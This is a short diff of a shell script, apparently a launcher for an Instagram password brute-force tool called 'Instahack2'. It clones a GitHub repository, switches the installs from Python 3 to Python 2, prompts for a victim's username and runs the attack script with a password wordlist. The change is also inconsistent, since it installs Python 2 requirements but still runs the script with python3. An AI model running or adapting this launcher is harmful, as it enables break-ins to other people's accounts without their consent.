@@ -11,7 +11,7 @@ git clone https://github.com/Pure-L0G1C/Instagram
 fi
 #
 #
-pkg install python3
+pkg install python2
 cd Instagram
 clear
 figlet Instahack2
@@ -35,7 +35,7 @@ read -p "[+]=>" vitima
 #Iniciando o ataque
 clear
 figlet START
-pip3 install -r requirements.txt
+pip2 install -r requirements.txt
 python3 instagram.py $vitima /$HOME/instahack2/Brute-Force/wordlist/wordlist.txt -m 3
 fi
 exit
